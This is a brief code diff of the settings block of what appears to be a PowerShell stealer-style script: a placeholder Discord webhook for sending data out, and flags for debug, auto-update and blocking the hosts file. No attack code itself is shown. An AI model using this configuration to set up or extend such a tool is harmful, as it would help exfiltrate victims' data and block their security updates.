@@ -1,4 +1,4 @@
-$webhook = "YOUR_WEBHOOK_HERE" # DONT USE THIS IF YOU SET $autoupdate = $true, INSTEAD REPLACE "AUTOUPDATE WEBHOOK" IN LINE 44 WITH YOUR DISCORD WEBHOOK
+$webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
 $autoupdate = $false
 $blockhostsfile = $true
